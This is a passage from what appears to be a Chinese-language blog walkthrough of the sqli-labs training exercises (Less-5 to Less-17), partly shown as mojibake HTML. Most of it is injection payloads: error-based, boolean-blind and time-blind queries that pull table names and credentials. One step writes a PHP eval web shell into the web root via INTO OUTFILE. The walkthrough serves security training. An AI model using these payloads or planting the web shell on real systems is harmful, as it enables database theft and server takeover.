class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235643837.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235701283.png" class><h3 id="2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥"><a href="#2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥" class="headerlink" title="2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)"></a>2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)</h3><p><code>åœ¨å¸ƒå°”å‹æ³¨å…¥ä¸­ï¼Œæ­£ç¡®ä¼šå›æ˜¾ï¼Œé”™è¯¯æ²¡æœ‰å›æ˜¾ï¼Œä»¥æ­¤ä¸ºä¾æ®é€å­—çˆ†ç ´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101182907330.png" class><blockquote><p>æ­¤ç§æ³¨å…¥å¯ä»¥ä½¿ç”¨bpçš„intruderæ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œå¦‚ä¸‹å›¾ã€‚ç”±äºmysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å­—å…¸ä¸ºa-zã€0-9ï¼Œç‰¹æ®Šçš„åŠ ä¸Šç‰¹æ®Šå­—ç¬¦å³å¯ã€‚</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190352877.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190421957.png" class><p><code>ä¾æ¬¡ç±»æ¨ï¼Œè¿›è¡Œçˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183102013.png" class><p><code>æ¥ä¸‹æ¥è¿›è¡Œçˆ†ç¬¬ä¸€å¼ è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#x27;em&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),6)=&#x27;emails&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183326285.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183525900.png" class><p><code>çˆ†å‡ºç¬¬å››å¼ è¡¨ä¸ºusersï¼Œæ¥ä¸‹æ¥è¿›è¡Œçˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>ç¬¬ä¸€ä¸ªåˆ—åä¸ºid</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222734437.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>ç¬¬äºŒä¸ªä¸ç¬¬ä¸‰ä¸ªåˆ—åä¸ºusernameã€password</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222533544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222604381.png" class><p><code>çˆ†æ•°æ®å³usernameä¸passwordå­—æ®µçš„å†…å®¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select username from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185002099.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185116009.png" class><p><strong>ä¹Ÿå¯ä»¥ä½¿ç”¨substræˆªæ–­å‡½æ•°è¿›è¡Œçˆ†åº“ã€çˆ†è¡¨ã€çˆ†å­—æ®µ</strong></p><blockquote><p>substrå‡½æ•°ä¸limitä¸åŒï¼Œæˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºä»1å¼€å§‹ï¼Œè€Œlimitä»0å¼€å§‹</p></blockquote><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),3,1)=&#x27;c&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),4,1)=&#x27;u&#x27; -- -</span><br><span class="line">// åŒæ ·å¯ä»¥ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102204726445.png" class><p><code>ä¹Ÿå¯ä»¥ä½¿ç”¨ASCIIè¿›è¡ŒæŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and ord(substr(database(),1,1))=115 -- -</span><br><span class="line">// ordä¸ºASCIIè½¬æ¢å‡½æ•°ï¼Œsçš„ASCIIå€¼ä¸º115ã€‚</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205332810.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205349191.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#x27;u&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,2)=&#x27;us&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,3)=&#x27;use&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,4)=&#x27;user&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205811674.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102210130815.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222854581.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),1,8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),1,8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223125374.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223201941.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223440143.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223459949.png" class><p><strong><em>skipï¼šè¿™ç§æ–¹æ³•å°±æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œç´¯å‚»å°å­çš„æ´»å»ºè®®sqlmapğŸ’‚â€â™€ï¸</em></strong></p><h3 id="3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥"><a href="#3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥" class="headerlink" title="3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)"></a>3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)</h3><p><code>çˆ†åº“åé•¿åº¦ï¼Œè¿™é‡Œä¾æ—§å¯ä»¥ä½¿ç”¨intruder</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(length(database())=8,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190911402.png" class><p><code>çˆ†åº“</code></p><p><code>ä¹Ÿå¯ä»¥å°†length()æ¢ä¸ºsubstr()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/id=1&#x27; and if(left(database(),8)=&#x27;security&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191846689.png" class><p><code>çˆ†è¡¨ï¼Œç¬¬å››å¼ è¡¨ä¸ºusers</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191536441.png" class><p><code>çˆ†usersè¡¨çš„å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),8)=&#x27;id&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192412154.png" class><p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µä¸ºusernameã€password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27;,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),8)=&#x27;password&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192640873.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192551041.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select username from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select password from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193118321.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193031194.png" class><p><strong><em>skipï¼šåŒæ ·ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´æ˜¯ä¸€ä¸ªä¸é”™çš„æ‰‹æ®µ</em></strong></p><h2 id="0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·"></a>0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·</h2><p><code>åŒLess5ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p><h2 id="0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶"><a href="#0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶"></a>0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶</h2><p><code>é¦–å…ˆéœ€è¦çŸ¥é“webåå°çš„è·¯å¾„æ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨Less-1ï¼Œèœç‹—çš„æˆ‘æ²¡æœ‰æƒ³åˆ°å…¶ä»–å¥½åŠæ³•.....</code></p><blockquote><p>IISé»˜è®¤è·¯å¾„æ˜¯    C:\Inetpub\wwwroot</p><p>nginxä¸€èˆ¬æ˜¯    /usr/local/nginx/htmlï¼Œ/home/wwwroot/defaultï¼Œ/usr/share/nginxï¼Œ/var/www/htmç­‰</p><p>apacheæ˜¯    /var/www/htmlï¼Œ/var/www/html/htdocs</p><p>phpstudy å°±æ˜¯    \PhpStudy\WWW\</p><p>xammp å°±æ˜¯    \xampp\htdocs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,@@basedir,@@datadir -- -</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­basedirä¸ºMySQL çš„å®‰è£…è·¯å¾„ï¼Œdatadirä¸ºMySQL çš„æ•°æ®åº“æ–‡ä»¶è·¯å¾„</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101215105882.png" class><p><code>å¯ä»¥çŒœåˆ°webè·¯å¾„ä¸ºC:\phpstudy\wwwï¼Œä¹‹åå°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶</code></p><p><code>è¿™é‡Œå·²ç»æ¢æµ‹åˆ°é—­åˆå­—ç¬¦ä¸º&#39;))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-7/?id=0&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;demo&quot;]);?&gt;&#x27; into outfile &quot;C:\\phpStudy\\www\\sqli\\less-7\\demo.php&quot; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220528860.png" class><p><code>è®¿é—®demo.phpæŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220623654.png" class><p><code>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220848719.png" class><h2 id="0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·"><a href="#0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·"></a>0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·</h2><blockquote><p>åŒLess5 æ–¹æ³•äºŒ</p></blockquote><h2 id="0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·"><a href="#0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·"></a>0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·</h2><p><code>æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½åªæœ‰You are in...</code></p><blockquote><p>åŒLess5 æ–¹æ³•ä¸‰</p></blockquote><h2 id="0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·"><a href="#0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·" class="headerlink" title="0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·"></a>0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·</h2><blockquote><p>åŒLess9ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</p></blockquote><h2 id="0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>unameå­˜åœ¨æ³¨å…¥</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100217440.png" class><p><code>æµ‹è¯•å‘ç°åªå­˜åœ¨ä¸¤ä¸ªå­—æ®µ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100626749.png" class><p><code>ä¸¾ä¸ªæ —å­</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100826775.png" class><blockquote><p>å…¶ä»–æ–¹æ³•å¦‚Less-1</p></blockquote><h2 id="0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess-11ï¼Œåªéœ€è¦å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·åŠ æ‹¬å·å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) -- -&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess-5</code></p><blockquote><p>æ–¹æ³•ä¸€ã€äºŒã€ä¸‰å‡å¯ç”¨</p></blockquote><p><code>æ–¹æ³•1</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110042606.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110103120999.png" class><p><code>æ–¹æ³•äºŒ</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110308320.png" class><p><code>æ–¹æ³•ä¸‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110528568.png" class><h2 id="0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·"></a>0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·</h2><blockquote><p>åŒLess-13ï¼Œå°†å•å¼•å·+æ‹¬å·æ¢ä¸ºåŒå¼•å·å³å¯</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111000136.png" class><h2 id="0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·"><a href="#0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·" class="headerlink" title="0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·"></a>0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·</h2><p><code>åŒLess-5çš„æ–¹æ³•äºŒä¸æ–¹æ³•ä¸‰</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111527544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111652045.png" class><h2 id="0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·"><a href="#0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·"></a>0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·</h2><blockquote><p>åŒLess-15ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·+æ‹¬å·å³å¯</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110112154590.png" class><h2 id="0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢"><a href="#0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢" class="headerlink" title="0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢"></a>0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢</h2><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œå½“unameçš„å€¼åé¢æœ‰ç‰¹æ®Šç¬¦å·ä¼šåŠ ä¸Šä¸€ä¸ª/è¿›è¡Œè½¬ä¹‰</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span 